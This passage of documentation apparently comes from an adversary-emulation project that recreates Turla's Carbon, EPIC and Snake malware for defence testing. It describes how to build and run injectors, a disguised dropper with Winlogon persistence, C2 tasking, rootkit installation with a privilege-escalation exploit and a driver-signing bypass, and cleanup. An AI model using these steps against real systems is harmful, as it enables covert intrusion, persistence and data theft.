ciphertext blob. The first 256 bytes contain an RSA ciphertext, which when decrypted provides a base64-encoded random CAST-128 symmetric key. This key is then used to decrypt the rest of the ciphertext blob, which contains the actual task information. The RSA private key used for the first round of decryption is included in the configuration file and is set to (DER-encoded base64):","Carbon DLL has used a similar encryption setup for C2 responses in the past 1, with additional components such as an intermediary signature block.","Carbon DLL has used hardcoded encryption keys in the past. For the comms library module, the CAST-128 symmetric key for file encryption is hardcoded as the following (hex-encoded): f2d4560891bd948692c28d2a9391e7d9","Note that in all cases, CAST-128 encryption was done in CBC mode, and RSA encryption was done with OAEP padding and SHA1 hash.","The 2048-bit RSA public/private key pair used for this implant was generated using Crypto++'s GenerateRandomWithKeySize method and then encoded to DER format. To convert from DER to PEM format, you can use the following openssl commands:"]},{"l":"Logging","p":["To assist operators in troubleshooting, the comms lib will log errors and debugging output to the following file on the target host: C:\\Program Files\\Windows NT\\2028\\dsntport.dat. Each log file line is base64-encoded and CAST-128 encrypted with the following format:","The CAST-128 encryption key is the same hardcoded key used to encrypt/decrypt other files.","To decrypt the logs on a Linux machine, you can use the decrypt_logs.py utility:"]},{"i":"how-to-run","l":"How to Run:","p":["The primary DLL will be injected into browsers by the Carbon Orchestrator DLL."]},{"l":"How to Perform Cleanup","p":["There is no required cleanup for testing the library. However, for cleaning up Carbon in execution, see the cleanup file at turla/Resources/cleanup/Carbon/carbon_cleanup.ps1."]},{"i":"how-to-build","l":"How to Build:","p":["This program is using CMake to compile and CL compiler for Windows.","The module requires the Crypto++ library to be built and linked at compile-time. vcpkg was used to install crypto++ for x64-windows, and the installation directory is set as the VCPKG_ROOT system environment variable."]},{"l":"Via Commandline","p":["Build the comms library DLL using the following cmake commands in administrator Powershell from the Resources\\Carbon\\CommLib directory. If you want to adjust certain preprocessor directives for the Carbon home directory, config file path on disk, and finished tasks path directory, you can do so in the compilation command:","To remove symbols, you can use the strip command:","To verify symbol removal, you can run strings or objdump --syms bin\\commlib.dll- you should see an empty symbols table.","Note that the above compilation command will also build the unit tests, which you can run via:"]},{"i":"on-windows-in-vscode-through-visual-studio-tools","l":"On Windows in VSCode Through Visual Studio Tools:","p":["./bootstrap-vcpkg.sh","./vcpkg integrate install","Alternative option is to setup tasks.json as described on the website. Compiler path in c_cpp_properties.json will also need to change to \"compilerPath\": \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.33.31629\\bin\\Hostx86\\x86\\cl.exe\"","cd C:\\","cd vcpkg","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","CMake","CMake Tools","CMake: CMake Path","CMake: Generator","From the Start Menu, open \"Developer Command Prompt for VS 2022\"","git clone https://github.com/Microsoft/vcpkg.git","If cmake was already installed but not on your path, fully uninstall and install with the above arguments.","In Command Palette, run CMake: Build. Run on any compiler.","Install Build Tools for Visual Studio 2022","Install vcpkg with these commands:","Make sure CMake is installed on your machine","Make sure this is empty","Make sure you have the extentions:","Mine is at C:\\Program Files\\Cmake\\bin\\cmake.exe.","Navigate to folder with code, then use code . to open VS Code.","See https://code.visualstudio.com/docs/cpp/config-msvc","Set a system level environment variable named VCKPG_ROOT to the root of your installation directory. For example, VCPKG_ROOT = C:\\Users\\dev\\vcpkg.","Set to where ever the cmake executable is located","Setup VSCode to Use MSVC","Some settings are required for CMake in VSCode:","The projects dependencies (cryptopp) will now automatically be installed at build time.","You will need to restart the shell to use cmake."]},{"l":"Common Compiling Errors","p":["For all problems: start by deleting the build folder than using the CMake: Delete Cache and Reconfigure command. With most changes below, this is needed to actually register the change.","If the compiler complains that \"cryptopp::cryptopp\" does not exist, change src/CMakeLists.txt on line 37 and 39 from \"cryptopp::cryptopp\" to \"cryptopp-static\".","If the compilation process says it cannot find cryptopp package, manually install cryptopp on the system with matching compiler triplet. Example: vcpkg.exe install cryptopp:x64-windows.","If the compiler complains about a missing external symbol within cryptopp, named something like __ std_find_trivial_1, change to a different compiler version. Windows compiler version 17.3 seems to be troublesome with cryptopp, but not always. Do the full refresh described above after the compiler change."]},{"l":"How to Test","p":["To setup testing, you must have the C2 server up and running on a seperate machine, and this code must be run from VS Code in administrator mode. The environment variable VCPKG_ROOT must already be set when opening powershell.","Tests are also run through CMake. Make sure CMake is installed with the instructions above.","For the tests to run properly, a C2 server providing tasks needs to be at 10.0.2.11:8080 with a resource at /javascript/view.php. To change the address of the C2 server, edit values in dummyConfigFile.txt and testing.h."]},{"i":"on-windows-in-vscode","l":"On Windows in VSCode:","p":["In Command Palette, run CMake: Run Tests."]},{"l":"In a Shell in Windows Powershell","p":["Once the package is built, run $ cd build then $ ctest"]},{"l":"CTI Sources","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html"]},{"l":"Missing Items","p":["Some details differ from the CTI. This includes the checks of other websites before connection to the C2 server. Our version of the communications library also does not execute any commands, always passes them on to the orchestrator."]},{"l":"External Libraries and Tools Used","p":["CMake is used for compilation, which is distributed under the OSI-approved BSD 3-clause License. None of the CMake code is included in the files.","Vcpkg is used but not packaged with this code. The software is managed by Microsoft and licensed under the MIT License, authorizing free use of the software."]}],[{"l":"EPIC","p":["EPIC is broken up into the following components:| Component | Description || --- | --- || Payload | Third stage worker DLL for the EPIC implant. It is compiled as a DLL, and communicates with a hardcoded C2 server and port value via HTTP POST requests. || Reflective Guard | Second stage guard DLL for the EPIC implant. It is compiled as a DLL, and loads the third stage payload or an arbitrary .dll substitute as an embedded resource. || Reflective Injector | First stage injector for the EPIC implant. It is compiled as an executable, and loads the second stage guard or an arbitrary .dll payload as an embedded resource. || Simple Executable Dropper | \"Simple\" dropper program that enables the delivery of an executable to a subtle location on the victim machine and alters the registry keys so that the executable will run on the user's logon. |"]},{"l":"Build Instructions","p":["Manually","All instructions to build the EPIC components manually are detailed in their respective READMEs. The links to the individual build sections are below.","Payload Build Guard Build Injector Build SimpleDropper Build","Using the build script","You can use the buildall.ps1 script to build any or all of the EPIC components.","From the turla\\Resources\\EPIC directory in Powershell:","The script will use HTTP and a default C2 server (address and port) if none are specified. If no EPIC components are specified in the build input, all components will be built by default. To build one or more specific components, input any variation of: payload guard injector simpledropper. To build all of the components, input all.","No cleanup is required to rebuild the components using the script. If building the payload or guard DLLs, the script will create a txt file in the EPIC directory containing the converted DLL shellcode. All necessary resource preparation for the components is handled by the build script. If you would like to add an alternative resource, please follow the instructions detailed in the component's respective README linked above."]},{"l":"Execution Details","p":["Payload Execution Guard Execution Injector Execution SimpleDropper Execution"]},{"l":"Cleanup Instructions","p":["Cleanup instructions for the individual EPIC components are linked below.","Payload Cleanup Guard Cleanup Injector Cleanup SimpleDropper Cleanup","Using the cleanup script","EPIC's cleanup script can be accessed here. This script should be run from the domain controller of the range with administrative privileges.","For Carbon scenario cleanup:","From the Kali Linux machine ( 176.59.15.33):","Open an Admin PowerShell and execute the cleanup script:","Note: To cleanup the SYSTEM-level EPIC implant, a reboot of HOBGOBLIN is required.","Sign out of the RDP session when finished.","For Snake scenario cleanup:","NOTE: A restart of AZUOLAS is not required as long as Egle as been logged out."]},{"l":"Troubleshooting"},{"l":"SimpleDropper","p":["Check via Registry Edit as the current user that the Winlogon key was properly created:","HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","Check that the injector mxs_installer.exe was dropped to the user's%APPDATA% folder"]},{"l":"Injector","p":["At the user-level, the injector is not selective of which explorer.exe it injects into. If there are additional users logged into the host, there is a chance the injector may inject into an explorer.exe that does not belong to the current user."]},{"l":"Guard","p":["At the user-level, the guard is will search for msedge.exe processes(among other browser-like processes) to inject into. If none exist, guard will wait until an msedge.exe becomes available.","Similar to the injector, no additional users should be logged into the host."]},{"i":"payloadworker-dll","l":"Payload/Worker DLL","p":["Check if %APPDATA%\\Temp\\~D723574.tmp is growing in size every 15 seconds","If yes:","C2 domain/port may be incorrect","C2 server may be configured improperly","Network flow may be configured improperly (redirectors, etc.)","If not or it's missing:","Payload/Worker DLL was most likely not injected into Edge properly"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"l":"EPIC Guard"},{"l":"Overview","p":["This is the second stage guard DLL for the EPIC implant. It is compiled as a DLL, and loads the third stage payload or an arbitrary .dll substitute as an embedded resource. The guard, once compiled, can only be run via it's exported function Protection. A small DLL_Run solution is included to run guard directly from Visual Studio. It can also be run via rundll32.exe, but console output and debugging will be unavailable.","The guard, like its parent injector, behaves differently based on what permissions it has, and evaluates said permissions at runtime. If the guard does not have elevated permissions then it will target a browser or other low privilege internet enabled application for injection with its payload.","However, when run from a process with elevated privileges, such as PsExec, Services.exe, or an elevated injector, guard will change its target. In order to ensure elevated permissions for its payload Guard changes the injection target to another elevated process- i.e. an instance of svchost.exe with SE_DEBUG privileges (but not its current process)."]},{"l":"Set Up"},{"l":"Visual Studio","p":["Ensure that the correct character set is selected:","Project Properties Advanced Character Set select No Set.","Check that the project has a Resource.rc file. If one does not exist create one:","right-click project Add New Item Resource Resource File.","If one alreadys exists, check that the Resource.rc file has no resources loaded, and delete any found:","double-click Resource.rc drop down menu right-click IDR_EXAMPLE_BIN1 delete.","Remove Compilation Warnings:","Project Properties C/C++ Preprocessor Preprocessor Definitions Edit new line _CRT_SECURE_NO_WARNINGS."]},{"l":"Resource Preparation","p":["Compile the payload you would like to use, or DLL_Test solution (included), as you would any other DLL (\"build\" in VS works fine)","Follow this guide for converting the payload to shellcode.","Clone the sRDI repo, Note that you must checkout the sRDI repo to commit 5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a or it will not function.","Open Powershell and navigate to the Powershell directory of the sRDI repo (double check that you're checked out to the correct commit).","Move a copy of the compiled .dll file to the Powershell directory (GUI or mv cmd work).","Import the conversion module: Import-Module .\\ConvertTo-Shellcode.ps1","Perform the conversion:","Paste the contents of the payload.txt file into HxD and save it as a binary (i.e. DLLTest.bin). Remember the location of this binary, you will need it for the next step.","Once the .dll file has been converted to a shellcode binary follow this guide for adding it as a resource.","Click on Resource Files in Solution Explorer and selected Add Resource. (Note that if your project does not have a .rc file you will need to create one)","Click Import and navigate to wherever you stored the .bin file from Step 2 above.","Give the resource a type name; I suggest something simple as you will need to remember it later. Ex \"TEST_BIN\"","The resource file should now show up in your program's resource view","Change the arguements of the FindResourceW() call in Source.cpp to match the new resource name. If you used the examples above it would be: FindResourceW(NULL, MAKEINTRESOURCEW(IDR_TEST_BIN1), LTEST_BIN)","Build the updated reflective-guard solution in VS"]},{"l":"Build Instructions","p":["From Visual Studio:","From Solution Explorer:","Build Build Solution","The compiled executable(s) should appear in:","turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\DLL_Run.exe","turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\Intermediary.dll"]},{"l":"Execution","p":["The Reflective Guard is intended to execute in the scenario as an embedded resource inside of EPIC's Reflective Injector, which is subsequently embedded in the SimpleDropper executable. Executing either the Injector or SimpleDropper executables will result in it's execution. To execute just the Guard DLL and it's embedded resource, spawn an msedge.exe process and then run DLL_Run.exe. See here if you encounter any issues."]},{"l":"From Visual Studio","p":["Build the executable from Visual Studio as instructed above","At the top of the VS window click \"Local Windows Debugger\" or \"Start Without Debugging\""]},{"l":"As A Service","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","sc.exe create [service name] binpath= turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\DLL_Run.exe type= own start= demand error= normal","Open Services.exe and start the service with [service name]"]},{"l":"From PsExec","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","psexec -i -s turla\\Resources\\EPIC\\Defense-Evasion\\reflective-guard\\x64\\Release\\DLL_Run.exe"]},{"l":"Cleanup Instructions"},{"l":"Logging Enabled","p":["From an admin command prompt run:","del C:\\Users\\Public\\guard_log.txt"]},{"i":"as-a-service-1","l":"As A Service","p":["From an admin command prompt run:","sc delete [service name]"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"l":"EPIC Injector"},{"l":"Overview","p":["This is the first stage injector for the EPIC implant. It is compiled as an executable, and loads the second stage guard or an arbitrary .dll payload as an embedded resource. The injector, once compiled, can be run from anywhere, including making it the target of PsExec or a Windows Service.","The injector behaves differently based on what permissions it has, and evaluates said permissions at runtime. If the injector does not have elevated permissions then it will target explorer.exe for injection with its payload.","However, when run from a process with elevated privileges, such as PsExec or Services.exe injector will change its target. In order to retain elevated permissions for its payload it changes the injection target to another elevated process- i.e. an instance of svchost.exe with SE_DEBUG privileges."]},{"l":"Set Up"},{"l":"Visual Studio","p":["Ensure that the correct character set is selected:","Project Properties Advanced Character Set select No Set.","Check that the project has a Resource.rc file. If one does not exist create one:","right-clcik project Add New Item Resource Resource File.","If one alreadys exists, check that the Resource.rc file has no resources loaded:","double-click Resource.rc drop down menu right-click IDR_EXAMPLE_BIN1 delete.","Remove Compilation Warnings:","Project Properties C/C++ Preprocessor Preprocessor Definitions Edit new line _CRT_SECURE_NO_WARNINGS."]},{"l":"Resource Preparation","p":["Compile the payload you would like to use, or DLL_Test solution (included), as you would any other DLL (\"build\" in VS works fine)","Follow this guide for converting the payload to shellcode.","Clone the sRDI repo, Note that you must checkout the sRDI repo to commit 5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a or it will not function.","Open Powershell and navigate to the Powershell directory of the sRDI repo (double check that you're checked out to the correct commit).","Move a copy of the compiled .dll file to the Powershell directory (GUI or mv cmd work).","Import the conversion module: Import-Module .\\ConvertTo-Shellcode.ps1","Perform the conversion:","Paste the contents of the payload.txt file into HxD and save it as a binary (i.e. DLLTest.bin). Remember the location of this binary, you will need it for the next step.","Once the .dll file has been converted to a shellcode binary follow this guide for adding it as a resource.","Click on Resource Files in Solution Explorer and selected Add Resource. (Note that if your project does not have a .rc file you will need to create one)","Click Import and navigate to wherever you stored the .bin file from Step 2 above.","Give the resource a type name; I suggest something simple as you will need to remember it later. Ex \"TEST_BIN\"","The resource file should now show up in your program's resource view","Change the arguements of the FindResourceW() call in Source.cpp to match the new resource name. If you used the examples above it would be: FindResourceW(NULL, MAKEINTRESOURCEW(IDR_TEST_BIN1), LTEST_BIN)","Build the updated reflective-injector solution in VS"]},{"l":"Build Instructions","p":["From Visual Studio","From Solution Explorer:","Build Build Solution","The compiled executable should appear in:","turla\\Resources\\EPIC\\Defense-Evasion\\reflective_injector\\x64\\Release\\Primary.exe"]},{"l":"Execution","p":["The injector is intended to be executed in the scenario as an embedded resource inside of the SimpleDropper executable. To execute just the Reflective Injector and its embedded resources, spawn an explorer.exe (and msedge.exe if the Reflective Guard DLL is embedded) process and then run the compiled executable Primary.exe. See here if you encounter any issues."]},{"l":"From Visual Studio","p":["Build the executable from Visual Studio as instructed above","At the top of the VS window click \"Local Windows Debugger\" or \"Start Without Debugging\""]},{"l":"As A Service","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","sc.exe create [service name] binpath= turla\\Resources\\EPIC\\Defense-Evasion\\reflective_injector\\x64\\Release\\Primary.exe type= own start= demand error= normal","Open Services.exe and start the service with [service name]"]},{"l":"From PsExec","p":["Build the executable from Visual Studio as instructed above","From an admin command prompt run:","psexec -i -s turla\\Resources\\EPIC\\Defense-Evasion\\reflective_injector\\x64\\Release\\Primary.exe"]},{"l":"Cleanup Instructions"},{"l":"Logging Enabled","p":["From an admin command prompt run:","del C:\\Users\\Public\\injector_log.txt"]},{"i":"as-a-service-1","l":"As A Service","p":["From an admin command prompt run:","sc delete [service name]"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"i":"simple-notflash-executable-dropper","l":"Simple \"NotFlash\" Executable Dropper"},{"l":"Overview","p":["This is a \"simple\" dropper program that combines two needs:","Delivery of an executable to a subtle location on the victim machine after they double-click a \"NotFlash installer\" file.","Alteration/addition of registry keys so that the delivered executable runs on the user's next login.","Much of this README is cribbed from the EPIC's Reflective Injector README and may, in the future, be upgraded to fully allow entirety of what is bundled in the dropper to never touch disk. As it is, an executable is placed inside the user's hidden AppData\\Local\\TEMP directory.","The Registry Key modification is notably of the H_KEY_CURRENT_USER, not H_KEY_LOCAL_MACHINE - the WinLogon trigger requires the same user to log in. The executable is run via the Shell Registry Key - on logon, a Command Prompt is opened and will run the dropped executable before running a second exe: explorer.exe. Thus it appears normal login execution resumes and the Desktop is available."]},{"l":"Set Up"},{"i":"prior-assumtions--requirements","l":"Prior Assumtions & Requirements","p":["This dropper program needs an existing executable file as a resource. This README assumes that Reflective Injector, or whichever other payload you choose, is already created as an executable file."]},{"l":"Visual Studio Setup","p":["Ensure that the correct character set is selected:","Project Properties Advanced Character Set select No Set.","Check that the project has a Resource.rc file. If one does not exist create one:","right-click project Add New Item Resource Resource File.","If one alreadys exists, check that the Resource.rc file has no resources loaded:","double-click Resource.rc drop down menu right-click IDR_EXAMPLE_BIN1 delete.","Remove Compilation Warnings:","Project Properties C/C++ Preprocessor Preprocessor Definitions Edit new line _CRT_SECURE_NO_WARNINGS."]},{"l":"Resource Preparation","p":["Click on Resource Files in Solution Explorer and selected Add Resource.","Click Import and navigate to wherever your executable file is located.","Give the resource a type name; I suggest something simple as you will need to remember it later. Ex \"SHINY_BOI\"","The resource file should now show up in your program's resource view","Change the arguements of the FindResourceW() call in Source.cpp to match the new resource name. If you used the examples above it would be:"]},{"l":"Build Instructions","p":["From Visual Studio","From Solution Explorer:","Build Build Solution","The compiled executable should appear in:","turla\\Resources\\EPIC\\SimpleDropper\\x64\\Release\\SimpleDropper.exe"]},{"l":"Execution","p":["To execute the SimpleDropper, run the compiled executable SimpleDropper.exe. If the Reflective Injector and Reflective Guard are embedded, ensure you have the explorer.exe and msedge.exe processes running. See here if you encounter any issues."]},{"l":"From Visual Studio","p":["Build the executable from Visual Studio as instructed above.","At the top of the VS window click \"Local Windows Debugger\" or \"Start Without Debugging\""]},{"l":"Test Instructions","p":["Much of the following is noted in the code in comments:","Testing the SimpleDropper to ensure that it delivers a working exe is tricky, as it is reasonable that you want to make sure your embedded exe works, but you don't want to hijack your own machine.","When testing, you really only need to see that you are able to modify a registry key to run an executable of your choice on startup.","So, test your executable separately, and then test the dropper by simply running the dropper itself on startup. To test:","Compile and run SimpleDropper (you need to run it to change the registry.)","Take the compiled SimpleDropper executable and place it on your desktop, or whichever other place you assign to the exe_location variable.","Delete your newly-dropped injector exe, which is located in your local AppData\\Local\\Temp folder until further updates","Log out and back in again.","SimpleDropper should run (again) on startup, depositing an executable file in the same place. If your deleted injector reappears, your dropper is working. Comment out the test-assignment of exe_location and uncomment the release-assignment (should be right below in the code, setting exe_location equal to full_path, the path to the embedded exe you just dropped in AppData\\Local\\Temp. Thus, instead of running itself on startup, someone who double-clicks the SimpleDropper will run an executable of your choice on startup)"]},{"l":"Cleanup Instructions","p":["Restore the Winlogon key altered at the executing user's HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon so that only 'C:\\Windows\\explorer.exe' is run on login","Remove the EPIC injector executable in the executing user's AppData\\Local\\Temp directory: '%TEMP%\\mxs_installer.exe","Cleanup the embedded artifacts ( Guard/ Payload)"]},{"i":"cti--references","l":"CTI / References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/","https://stackoverflow.com/questions/71073166/how-to-embed-an-exe-file-into-another-exe-file-as-a-resource-in-c"]}],[{"l":"EPIC Payload"},{"l":"C2 Communications","p":["The EPIC payload communicates with a hardcoded C2 server and port value via HTTP POST requests. 1"]},{"l":"C2 Registration","p":["The module will automatically perform initial discovery commands and output the results to a tmp file in %TEMP% with a random string in its filename: %TEMP%\\~Drandom.tmp. 1 For scenario purposes, this file name has been hardcoded to %TEMP%\\~D723574.tmp. The discovery output is returned in the POST request body.","The POST request body is bzip2 compressed and then formatted in a Base64 encoded JSON string with fields UUID, type, and data and are not made to any particular subfolder and are sent to the URL path / of the C2 server site. The initial heartbeat is structured as follows:","EPIC will use the type field to indicate to the C2 server what type of data to receive based on the task.","Type","Description","command","Associated with the exe key - indicates the returned data contains command output","upload","Associated with the result key - indicates the returned data contains a file","download","Associated with payloads and the name key - indicates download was successful","delete","Associated with the name and del_task keys - indicates delete was successful","Upon registration with the C2 server, the module will receive a UUID to use in future communications. The module will then continue to perform POST requests to the domain name of the C2 server site to receive instructions and return result output."]},{"l":"Execute Commands","p":["Upon receiving instructions to execute commands, the module will execute the command, append command output to %TEMP%\\~D723574.tmp, and return the command output in the next C2 communication cycle. 1"]},{"l":"Execution","p":["The Payload is intended to execute in the scenario as an embedded resource inside of EPIC's Reflective Guard, which is subsequently embedded in the Reflective Injector. Executing either the Guard DLL or Injector executable will result in the execution of the Payload DLL. To execute just the Payload, you can run it via rundll32.exe with the exported function PayLoop. See here if you encounter any issues."]},{"l":"Tasks","p":["0","4","8","8 + p","8 + p+ 4","Byte Offset","Command ID","Configuration","Configuration size","Configurations are INI structured files which contain some of the following fields:","del_task","Delete a file.","Description","EPIC instructions are structured as followed:","Example delete file configuration:","Example download file configuration (instruction should have associating payload data):","Example execute command configuration:","Example upload file configuration:","exe","Execute a command, redirect its output to the file %TEMP%~D%random%.tmp. The file is then uploaded during the next C&C communication cycle.","Instruction Section","Instructions with no payloads (EXE binaries) to download to the module will have a Payload size of 0.","Name","Payload","Payload size ( p)","result","Set the filename that is supposed to contain the results of command execution. Effectively, any existing file may be marked for upload by this command.","Set the filename to be deleted or created (depends on other parameters)","The EPIC payload receives tasking from the C2 server as part of a successful beacon response.","To retrieve an instruction, the response should be base64 decoded and then bzip2 decompressed."]},{"l":"Encryption"},{"i":"rsa-encryption","l":"RSA encryption:","p":["sha1 hash function","OAEP padding","2048 bit key"]},{"i":"aes-encryption","l":"AES encryption:","p":["256 bit key","CBC mode of operation"]},{"l":"Build Instructions","p":["Notes about Bzip2 The EPIC payload used a modified version of BZip2 compiled as a static library. Modifications to BZip2 primarily consisted of stripping debug statements throughout the source files. The modifed BZip2 static library has been removed from this repository, however vcpkg will install an unmodified BZip2 library upon building the payload that will function as needed.","If you are interested in downloading and modifying BZip2, you can find it here. CMake build instructions can be found here. Once compiled, bz2_static.lib should be copied to payload\\libs\\lib\\bzlib.lib and the bzlib.h should be copied to payload\\libs\\include\\bzlib.h. Create the relevant directories if they do not already exist. Please also make the necessary adjustments to the CMakeLists.txt and vcpkg.json files. 1 2 3 4 5","From Visual Studio Developer PowerShell:","The compiled DLL and executable will be located in: EPIC\\payload\\bin","When built with the build script, EPIC will use a default C2 server (address and port) and HTTP for communications. To compile with a different C2 server address and port or to use HTTPS communications, change the corresponding values in the line from above ( cmake -S . -B build -DUSE_HTTPS=true/false...). For example, to build the payload with C2 server example.com, port 1234, and HTTPS selected, run:","Run the remaining command as written above. To note: the payload binary name res corresponds to HTTP and res2 to HTTPS.","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin\\test_res.exe- you should see an empty symbols table.","To run unit tests:"]},{"l":"Cleanup Instructions","p":["Remove the log file:","Kill all Edge browsers potentially containing payload injected into it:"]},{"l":"CTI References","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]}],[{"l":"Snake Rootkit","p":["Snake is a rootkit used by Turla, and the version in this repository emulates several features of the original rootkit 1:","hides itself by hooking into several Windows API functions","drops the usermodule DLL to disk ( C:\\Windows\\msnsvcx64.dll in our emulated variant)","injects the usermodule DLL into a SYSTEM process ( taskhostw.exe in our emulated variant) and into browser processes ( msedge.exe in our emulated variant) upon detecting outbound network traffic","When the rootkit is installed, its Snake home directory is set to C:\\Windows\\$NtUninstallQ608317$(can be changed at installer compile time), which is where the Snake rootkit driver file and usermodule DLL log files reside.","Snake has used similar home directories in the past, such as C:\\Windows\\$NtUninstallQ812589$ 1"]},{"l":"Components"},{"l":"Snake Installer","p":["The SnakeInstaller folder contains the source code, README, and additional resources for the Snake installer, which does the following:","Sets up the Snake home directory","Optional privilege escalation exploit CVE-2021-1732","DSE bypass by exploiting a vulnerable signed driver that is also dropped by the installer","Dropping the Snake rootkit driver to disk and installing it","Note that the Snake installer is bundled with both drivers inside, and since the Snake rootkit driver contains the embeded usermodule DLL, any changes to the usermodule DLL or to the rootkit driver will require a new installer to be compiled. Different installers will also be needed to target different hosts, since each usermodule DLL is compiled to reach out to a specific C2 domain or IP.","For more information on the Snake Installer, please see the installer README."]},{"l":"Snake Rootkit Driver","p":["The Snake rootkit driver is run by the Snake installer and performs various rootkit functionality:","hides itself by hooking into several Windows API functions via a modified InfinityHook library","drops the usermodule DLL to C:\\Windows\\msnsvcx64.dll(stored XOR-encrypted within the driver)","injects the usermodule DLL into taskhostw.exe","injects the usermodule DLL into browser processes (e.g. msedge.exe) upon detecting outbound network traffic","For more information on the Snake rootkit, please see the rootkit README."]},{"l":"Usermodule DLL","p":["The UserModule folder contains the source code, README, and additional resources for the Snake usermodule DLL, which does the following:","When injected into a browser process, handles C2 communications over HTTP","Retrieves tasking and payloads to forward to the non-browser usermodule variant, uploads files and task output","When injected into a non-browser process, executes commands","Supports executing commands via cmd, powershell, direct process creation, and also supports token impersonation.","Note that the usermodule DLL is given the C2 address and Snake home directory at compile-time, so any adjustments to such variables will require compiling a new usermodule DLL, and thus a new rootkit driver and installer.","For more information on the Snake usermodule DLL, please see the usermodule DLL README."]},{"l":"Usage","p":["To install the Snake rootkit using the Snake installer, you can use the following commands for default options:","(with privilege escalation exploit):","(without privilege escalation exploit - requires admin privileges)","For additional installer options, please see the installer README.","If you are running just the driver, you must have a machine with test signing mode ON. To do this, open an Administrative command prompt, enter Bcdedit.exe -set TESTSIGNING ON and reboot your machine. You should now see \"Test Mode\" in the bottom right hand corner of your desktop.","Run the script .\\run_driver.ps1 start in the same directory as your driver, and it will automatically create and start the driver for you. To stop the driver, run .\\run_driver.ps1 stop","If you are running the driver via the installer, test signing mode is not necessary."]},{"l":"Troubleshooting"},{"l":"Installer Troubleshooting","p":["Please see the Snake Installer README for installer-related troubleshooting steps."]},{"l":"Usermodule Troubleshooting","p":["./evalsC2client.py --set-task guid '{type: 6}'","dbsvcng64.bin for logging related to command execution (process creation, exit codes, command output)","Each log file covers different aspects of the implant:","If the Snake installer is successful but you don't receive a beacon, there are two main possible points of failure:","If you do not have a beacon, you will have to manually copy the files from the Windows target host to your linux C2 server, where you can call the control_server/handlers/snake/decrypt_logs.py utility like so:","If you have successful beacons and are troubleshooting other issues, you can task the implant to upload the logs to the C2 server, which will automatically decrypt them and write them to the control_server/files directory:","Note that error codes in the logs will either be a Windows system error code or a custom error code defined in UserModule/include/usermodule_errors.h","python3 decrypt_logs.py -p /path/to/log -o /path/to/output/file","svcmon32.sdb for C2-related logging (heartbeats, beacons, payload downloads, instruction parsing, data uploads)","svcstat64.bin for pipe server logging (when in pipe server mode)","The C2-related log ( svcmon32.sdb) is used exclusively by the browser-injected DLL process. If the file exists, then the injected DLL was at least able to get far enough to begin logging. If the file exists but is not being updated, then either the DLL crashed or is stuck waiting for the taskhostw-injected DLL to connect to it via named pipes.","The driver was unable to inject successfully into msedge.exe, or the injected DLL crashed","The driver was unable to inject successfully into taskhostw.exe or the injected DLL crashed","The execution log ( dbsvcng64.bin) is used exclusively by the taskhostw-injected DLL and has at least one line written to it when the injected DLL starts up. If the file exists, then the injected DLL was at least able to get far enough to begin logging.","There are two ways to decrypt and read the log files:","To investigate execution-related issues (e.g. failed token impersonation), look at the execution log.","To investigate general C2 communication issues, look at the C2 logs and pipe-related logging.","udmon32.bin for pipe client logging (when in pipe client / execution mode)","You can generally tell which injected DLLs started up by looking for the log files in the Snake home directory ( C:\\Windows\\$NtUninstallQ608317$) and checking their timestamps:"]},{"l":"Build","p":["For specific build/installation instructions for each component, please refer to their respective README files."]},{"l":"Debugging","p":["In order to properly test, it is recommended to setup a Virtual Machine on which install and run the driver. That's because any bugs in this code base can cause the executing system to crash. Additionally, this system will need to have test signing mode enabled, in order to load our unsigned driver.","To view any output from the driver will also require tooling with the ability to attach to the target system's kernel. Recommended solutions are to use WinDbg from the host machine for advanced debugging needs. Or, for lighter testing DebugView is capable of reporting messages printed from the driver.","WinDbg remote debugging setup instructions","DebugView download from SysInternals"]},{"l":"Cleanup","p":["A cleanup script has been provided here. This script should be run from an Admin PowerShell terminal.","The script will perform the following actions:","Cleanup any PsExec artifacts","Delete signed driver service","Delete unsigned driver service","Clean up installer directory","Delete Snake installer (if -deleteInstaller)","Restart the host (if -restart)","Remove dropped user module DLL","Recheck and redelete signed driver service","The script should be run with -restart if the user module DLL has been injected."]},{"l":"CTI and References","p":["https://artemonsecurity.com/snake_whitepaper.pdf","https://www.circl.lu/pub/tr-25/"]}],[{"l":"Snake Driver","p":["The Snake driver is the threat actor's rootkit. There are three projects included in this SnakeDriver Solution.","SnakeDriver - A WDM kernel driver project for the Snake rootkit","libinfinityhook - InfinityHook library, enables syscall hooks. More information can be found in ./libinfinityhook/README.md or on the InfinityHook GitHub","SnakeTester - userspace tool used to test certain syscall hooks"]},{"l":"Overview","p":["Once the installer successfully implants the Snake driver, it is responsible for evading 